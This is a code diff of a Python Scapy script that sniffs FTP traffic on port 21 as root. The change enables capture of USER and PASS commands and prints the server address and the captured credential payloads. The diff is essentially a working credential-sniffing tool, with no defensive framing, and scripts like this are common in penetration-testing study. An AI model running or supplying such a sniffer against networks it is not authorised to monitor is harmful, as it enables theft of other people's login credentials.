@@ -9,19 +9,15 @@ def packetCallBack(packet):
        ftp traffic for usernames and passwords.
     '''
     effteepea_packet = str(packet[TCP].payload)
-    effteepea = effteepea_packet.lower()
-    print effteepea
-    """
-    if "user" in effteepea or "pass" in effteepea:
+    if "USER" in effteepea_packet or "PASS" in effteepea_packet:
         print "[=>] Server: %s" % packet[IP].dst
         print "[=>] %s" % packet[TCP].payload
-    """
 
 
 if __name__ == '__main__':
     try:
         if os.getuid() == 0:
-            print "[>] Sniffing traffic on port 21...."
+            print "[>] Sniffing traffic on port 21 for credentials....\n"
             sniff(filter='tcp port 21', prn=packetCallBack, store=0)
         else:
             print "[!] Please run this script as root."
